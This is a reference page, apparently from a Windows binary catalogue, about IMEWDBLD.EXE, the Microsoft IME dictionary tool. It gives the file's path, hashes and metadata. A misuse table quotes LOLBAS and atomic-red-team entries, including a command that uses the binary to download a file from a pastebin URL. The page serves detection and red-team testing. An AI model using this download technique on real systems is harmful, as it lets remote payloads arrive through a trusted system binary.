---
title: IMEWDBLD.EXE | Microsoft IME Open Extended Dictionary Module
excerpt: What is IMEWDBLD.EXE?
---

# IMEWDBLD.EXE 

* File Path: `C:\windows\system32\IME\SHARED\IMEWDBLD.EXE`
* Description: Microsoft IME Open Extended Dictionary Module

## Screenshot

![IMEWDBLD.EXE](screenshots/IMEWDBLD.EXE-CB30AD795C9B30E71EB1E596D18B7A21.png)

## Hashes

Type | Hash
-- | --
MD5 | `8850DBB08A9158F8488E1D7DA2A62E6F`
SHA1 | `3D37A1BE298A38F4AA0934EB85BB32257E7C2CF0`
SHA256 | `69D9BE75C7F403B13D7D3344E5BD8244DE16CB2877D95C0715591419AED71FA4`
SHA384 | `68348EF39F951A1EC61B2180E5FF46A9E84168DA6874405FB3D8D0A20918A3C5252B551B38EE87A138D65142C078B7A3`
SHA512 | `2C7D5B780B481C307589B2CF77642BB72CF416DEB0BAF84D400FC1EF40EAC28C71955E3F1607E7114E94B3FF6785D1BB31045D12B9A1B6EC715D8877C49AB039`
SSDEEP | `12288:B6uUP+1T+Qp5C0M0hdX+SXCoeVK90v+7Gs/r:0k1T+Q/i0hDSHNrs/`

## Signature

* Status: The file C:\windows\system32\IME\SHARED\IMEWDBLD.EXE is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170
* Serial: ``
* Thumbprint: ``
* Issuer: 
* Subject: 

## File Metadata

* Original Filename: imewdbld.exe
* Product Name: Microsoft IME 2012
* Company Name: Microsoft Corporation
* File Version: 15.0.9600.18514
* Product Version: 15.0.9600.18514
* Language: Language Neutral
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `IMEWDBLD.EXE` being misused. While `IMEWDBLD.EXE` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Name: IMEWDBLD.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #17 - Download a file with IMEWDBLD.exe](#atomic-test-17---download-a-file-with-imewdbldexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #17 - Download a file with IMEWDBLD.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


